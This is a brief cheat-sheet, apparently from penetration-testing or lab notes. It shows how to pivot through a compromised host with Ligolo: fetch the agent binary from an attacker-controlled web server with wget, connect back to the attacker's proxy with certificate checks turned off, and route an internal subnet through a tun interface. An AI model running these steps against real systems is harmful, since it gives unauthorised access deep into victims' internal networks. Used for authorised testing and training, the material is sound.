## 1. Run Python web server from attacking machine. Host the 'agent.exe/agent' file.
`python3 -m http.server 8000`

2. Run from the compromised host.
`wget http://<AttackingIP>:<AttackingPort>/agent`

3. Run from your attacking machine.
`sudo ./proxy -selfcert`

4. Run from the compromised host. (If compromised host = Linux)
`sudo chmod +x ./agent`
`sudo ./agent -connect <AttackingIP>:11601 -ignore-cert`

If (compromised host = Windows)
`./agent.exe -connect <AttackingIP>:11601 -ignore-cert`

5. Run from Ligolo Proxy (From Attacking Machine)
`session`
`1`
`ifconfig`

In the above ifconfig command, copy the IP address of the interface. Let us assume the IP is 172.16.1.100

6. Run the following commands on the attacking machine to set up the interface.
`sudo modprobe tun`
`sudo ip tuntap add mode tun dev ligolo`
`sudo ip route add 172.16.1.0/24 dev ligolo`
`ip route list`

## Do you see the Ligolo interface now?
